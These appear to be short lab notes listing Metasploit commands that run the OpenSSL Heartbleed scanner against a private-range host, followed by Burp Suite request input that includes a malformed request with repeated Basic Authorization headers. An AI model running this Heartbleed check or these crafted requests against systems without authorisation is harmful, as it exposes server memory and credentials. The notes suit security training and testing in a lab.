Commands used:

msfconsole 

use auxiliary/scanner/ssl/openssl_heartbleed

set RHOSTS 192.168.253.142

exploit


Burpsuite Input:

GET / HTTP/1.1 
Host: 192.168.56.113 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Connection: close 
Upgrade-Insecure-Requests: 1

/fakepost.html HTTP/1.1 
TE: deflate,gzip;q=0.3 
Connection: TE, close 
Accept-Encoding: gzip 
Authorization: Basic cGFzczEyMw== 
Authorization: Basic cGFzczEyMw== 
Authorization: Basic cGFzczEyMw== 
Authorization: Basic cGFzczEyMw== 
Host: 192.168.56.106
Referer: http://fakesite.org 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20200101 Firefox/49.0